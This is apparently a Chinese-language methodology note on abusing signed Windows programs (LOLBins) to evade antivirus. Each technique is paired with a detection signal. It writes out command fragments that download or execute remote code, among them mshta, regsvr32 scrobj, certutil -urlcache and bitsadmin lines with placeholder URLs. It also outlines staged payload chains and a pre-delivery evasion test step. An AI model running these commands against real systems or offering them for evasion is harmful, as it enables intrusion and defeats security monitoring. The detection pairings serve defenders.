# LOLBins 与白名单程序滥用（签名为壳，行为为刃）

> 白名单免杀的系统化方法论：签名程序当"干净载体"，恶意意图藏在参数、数据文件、间接
> 组合里——静态引擎看签名与哈希全绿，行为才是检测面。技术↔检测侧逐类成对。

## 分类框架（滥用面四类）

| 类 | 滥用机制 | 代表程序族 | 检测侧配对 |
|---|---|---|---|
| ① 间接执行载体 | 签名程序执行传入代码/脚本（解释器型） | mshta/rundll32/regsvr32/wscript/cscript/msxsl/cmake/dnx | 父子进程链异常（office→mshta）；脚本内容审计；命令行参数特征 |
| ② 下载与外带 | 签名程序替代 curl/wget（流量合法化） | certutil/bitsadmin/mshta http/expand/curl(系统自带)/powershell | 出网进程白名单化基线偏离；URL 参数特征；传输量与业务模型偏离 |
| ③ 数据编码通道 | 签名程序做 base64/hex 编解码（C2 姿态伪装） | certutil -decode/-encode、powershell编码命令、msbuild 内联任务 | 编码参数组合遥测；出站编码负载统计 |
| ④ 权限与持久化原语 | 签名程序提供提权/计划任务/服务注册能力 | schtasks/sc/fodhelper/事件订阅/COM 对象劫持（注册表层） | 注册表敏感键写审计；任务注册来源进程；COM 缺项加载监控 |

## 代表技术速查（按检出难度升序）

- **mshta 执行远程/内联脚本**：`mshta vbscript:Close(Execute("..."))`——hta 解释器全功能；
  检测：mshta 无窗口+网络并存。
- **rundll32 入口定制**：`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"`——JS 宿主；
  `rundll32 shell32.dll,Control_RunDLL` 藏参数。
- **regsvr32 scriptlet**：`regsvr32 /i:http://... scrobj.dll`——远程 sct 执行（老而未死：老系统面）。
- **certutil 双用**：`-urlcache -split -f http://x` 下载 / `-decode` 解码——参数审计主靶。
- **bitsadmin**：`/transfer /download /remoteurl`——后台智能传输（流量走系统服务=白）。
- **msbuild 内联任务**：项目文件内嵌 C# Task（`<UsingTask>`+inline）——构建引擎执行代码；
  检测：msbuild 无解决方案上下文。
- **installutil**：`/LogFile= /U assembly.dll`——安装器反射执行 [Run] 方法。
- **wmic 进程创建**：`process call create` + 远程 `/node:`——无 powershell 的横向执行。
- **cmake/dotnet 工具链解释器**：开发者机器合理进程——工程文件藏执行逻辑。
- **COM/注册表层**：DLL 缺项劫持（CAccPropServicesClass 等 CLSID 位）+ seh.dll 类——
  检测：注册表键值基线差分。

## 组合范式（实战形态）

1. **分阶段拆解**：载体（白程序）→ 数据（编码 payload）→ 执行（另一白程序解码运行）——
   每段单独看都"合法"，组合才恶意——检测靠链式关联（进程树+参数流）。
2. **持久化嫁接**：计划任务/服务/COM 劫持指向白程序+恶意参数——自启动面全签名。
3. **宏/脚本的载体替换**：初始执行从 powershell 换 wscript/cscript/mshta——同一 payload
   换宿主过不同引擎的语料。

## 检测侧总纲（蓝队视角，回馈 attack-defense 用）

- 进程树异常是第一信号（办公软件/邮件客户端派生解释器）；
- 命令行全量审计（参数组合特征 > 程序名特征——程序名永远合法）；
- 编码流量与白进程出网基线偏离；
- 注册表持久化位差分扫描；
- 组合链关联分析（单事件全绿，序列告警）。

## 变体登记

- 新签名程序持续入库（随系统更新）；检测侧同步维护"白程序敏感参数"清单；
- 每个新载体先过本地引擎族矩阵再进交付。
